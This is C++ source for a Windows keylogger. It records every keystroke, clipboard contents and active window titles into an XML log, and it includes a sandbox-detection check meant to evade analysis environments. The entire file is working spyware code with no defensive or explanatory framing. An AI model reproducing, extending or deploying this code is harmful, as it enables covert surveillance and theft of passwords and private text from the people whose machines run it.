#include "KeyLogger.h"

char* last_cb_data;
WSAData _socket;
using namespace std;
/*HKEY hkey;*/
char _GRAB_WINDOW_TITLE[MaxDirPathLength],_GRAB_WINDOW_TITLE_SECONDARY[MaxDirPathLength];
const time_t hms = time(0);
clock_t Timer = clock(), Timer2;
bool gotchar=true;

FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
{
    /*
        get the total length of the window text length.
    */
    int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
    /*
        grab the foreground title and other important information about the
        process. set the global title accordingly.
    */
    GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE,_FG_WINDOW_TITLELENGTH);
    /*
        generate a time stamp to indicate when the change occurred
    */
    char *TimeStamp=asctime(localtime(&hms));
    /*
        set a null character to the last byte of the time stamp.
    */
    TimeStamp[strlen(TimeStamp)-1]=0x00;
    /*
        print out the xml meta data relevant to the process.
    */
    cout<<"\n\t<Process>\n\t\t<ProcessHandle>"<<_PROG_HNDL<<"</ProcessHandle>\n\t\t<ProcessID>"<<GetWindowThreadProcessId(_PROG_HNDL,NULL)
    <<"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<TimeStamp<<"</TimeStamp>\n\t\t\t<logged>"
    <<"\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
    return 0 ;
}

FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
{   int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
    GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH);
    if (strcmp(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY))
    {
        strcpy(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY);
        char *TimeStamp=asctime(localtime(&hms));
        TimeStamp[strlen(TimeStamp)-1]=0x00;
        cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE_SECONDARY<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<
        TimeStamp<<"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
    }
}

FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyStrokeLogged)
{
   if (GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_0 and GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_1 and gotchar )
       {
           gotchar=false;
           if (LastKeyStrokeLogged!=VkPrimary)
               {
                   Timer=clock();
                   Timer2=Timer;
                   char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
                   switch(temp)
                   {
                     case '<':  cout << "&lt;"; break;
                     case '>':  cout << "&gt;"; break;
                     case '&':  cout << "&amp;"; break;
                     case '\'':  cout << "&apos;"; break;
                     case '"':  cout << "&quot;"; break;
                     default:  cout << temp; break;
                   }
                   LastKeyStrokeLogged=VkPrimary;
               }
           if((Timer-clock())/500 && ((Timer2-clock())/31))
               {
                   Timer2=clock();
                   char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
                   switch(temp)
                   {
                     case '<':  cout << "&lt;"; break;
                     case '>':  cout << "&gt;"; break;
                     case '&':  cout << "&amp;"; break;
                     case '\'':  cout << "&apos;"; break;
                     case '"':  cout << "&quot;"; break;
                     default:  cout << temp; break;
                   }
                   LastKeyStrokeLogged=VkPrimary;
               }
           }
   return LastKeyStrokeLogged;
}

FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogged )
{
    if (GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_0 and GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_1 and gotchar )
        {
            gotchar=false;
            if (LastKeyStrokeLogged!=FunctionKey)
                {
                    Timer=clock();
                    Timer2=Timer;
                    cout<<StrOut;
                    LastKeyStrokeLogged=FunctionKey;
                }
            if((Timer-clock())/500 && ((Timer2-clock())/31))
                {
                    Timer2=clock();
                    cout<<StrOut;
                    LastKeyStrokeLogged=FunctionKey;
                }
        }
    return LastKeyStrokeLogged;
}

FORCEINLINE int grabclipboard()
{
    if (OpenClipboard(NULL))
        {
            char* this_cb_data;
            HANDLE cb_lock_handle = GetClipboardData(CF_TEXT);
            if(cb_lock_handle)
                {
                this_cb_data=(char*)GlobalLock(cb_lock_handle);
                if(!strlen(this_cb_data))
                {

                    GlobalUnlock(cb_lock_handle);
                    CloseClipboard();
                    return 0;
                }
                if ( last_cb_data == NULL || (strncmp(last_cb_data,this_cb_data,strlen(this_cb_data)-1)))
                {
                    if(last_cb_data == NULL)
                        last_cb_data = (char*)malloc(strlen(this_cb_data)+1);
                    else
                        last_cb_data = (char*)realloc(last_cb_data,strlen(this_cb_data)+1);
                        strncpy(last_cb_data,this_cb_data,strlen(this_cb_data));
                    cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>"<<
                    "\n\t\t\t\t<Capture>"<<(char*)this_cb_data<<"</Capture>\n\t\t\t</logged>\n\t\t\t<logged>"<<
                    "\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" ;
                }
                GlobalUnlock(cb_lock_handle);
                }
            CloseClipboard();


        }
    return 0;
}

int main()
{

    /*
        execute a check to see if we may be in a sandboxed environment,
        the check relies on the number of processors running on the device
        if this check fails then exit from the environment
    */
    if(SandBoxDetection()) return SandBoxedInstance;
    /*
        display an xml header to generate the end document.
    */
    cout << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n";
    /*
        grab a handle to the foreground process.
    */
    HWND CURRENTPROCEESS=GetForegroundWindow();
    /*
        initialize the foreground window.
    */
    _USER_SHIFT_FOCUS(CURRENTPROCEESS);
    /*
        declare a buffer to store keyboard states.
    */
    unsigned int LastKeyStrokeLogged;
    /*
        the main loop, capture key strokes indefinitely.
    */
    while (1)
    {

        /*
            global flag that dictates the state of the keyboard buffer
            if the keyboard buffer is not empty from a previous key
            stroke then the program will fault
        */
        gotchar=true;
        /*
            determine if the user has shifted focus to a new process
        */
        if (CURRENTPROCEESS==GetForegroundWindow())
        {
            /*
                check to see if the value of the keyboard buffer is in one of two states
                0, or 1, if so then the global key state buffer is not sanitary and should not
                be trusted
            */
            if (GetAsyncKeyState(LastKeyStrokeLogged)== AsyncKeyStateTest_0 or GetAsyncKeyState(LastKeyStrokeLogged)==AsyncKeyStateTest_1)
                LastKeyStrokeLogged=1;
                /*default failed buffers to a state of (1)*/

            /*
                increment an anonymous value starting at the "0" position of the ASCII table and increment to
                "9".
            */
            for (int x=StartAsciiDec; x<EndAsciiDec; x++)
                /*
                    log the key and check for encoding from shift key state.
                    map secondary outputs as well for state.
                */
                LastKeyStrokeLogged=GrabKey(x,(char)x,_Char_Table[x-AsciiDecimalToBase],LastKeyStrokeLogged);
            /*
                increment an anonymous value starting at the "a" position of the ASCII table and increment to
                "Z".
            */
            for (int x=StartAsciiAlphebet; x<EndAsciiAlphebet;x++)
                /*
                    log the key and check for key case, finally send a secondary mapping so that shift
                     can be toggled.
                */
                LastKeyStrokeLogged=GetKeyState(VK_CAPITAL)?GrabKey(x,x,(x+AsciiLowerToUpper),LastKeyStrokeLogged):GrabKey(x,x+AsciiLowerToUpper,x,LastKeyStrokeLogged);
            /*
                iterate over the function keys
            */
            for (int x=StartFunctionKeys; x<EndFunctionKeys; x++)
                /*
                    log the intention justified by the function keys in a a character sequence that is likely not used
                    by the end user.
                */
                LastKeyStrokeLogged=GrabFuncKey(MapFunctionVkeys[x].Key,MapFunctionVkeys[x].str,LastKeyStrokeLogged);
            /*
                iterate over the set of keys available on the keyboard, but with no linear mapping.
            */
            for (int x=StartUnmapedKeys; x<EndUnmapedKeys; x++)
                /*
                    grab thous key states that are not linearly justified, also deliver to
                    the function secondary key states that can be toggled via the shift key.
                */
                LastKeyStrokeLogged=GrabKey(VkKeyScanExA(MapUnmapedVkeys[x].Primary,GetKeyboardLayout(0)),MapUnmapedVkeys[x].Primary,MapUnmapedVkeys[x].Secondary,LastKeyStrokeLogged);
        }
        else
        /*
            if the users focus has shifted from the currently logged foreground window
            then take steps to indicate the state change.
        */
        {
            /*
                complete the xml statements that were previously initialized then
                initialize a new process xml tag.
            */
            cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>";
            /*
                get the current foreground window and store it in the CURRENTPROCESS.
            */
            CURRENTPROCEESS=GetForegroundWindow();
            /*
                call to initialize tags and further process the foreground window.
            */
            _USER_SHIFT_FOCUS(CURRENTPROCEESS);
        }
        /*
            checks for changes in the clipboard state.
        */
        grabclipboard();
        /*
            it is common for titles to change in processes,especially in browsers.
            this checks if the current foreground window has registered under a new
            title.
        */
        EnterEvent(CURRENTPROCEESS);
    }
    return 0;
}
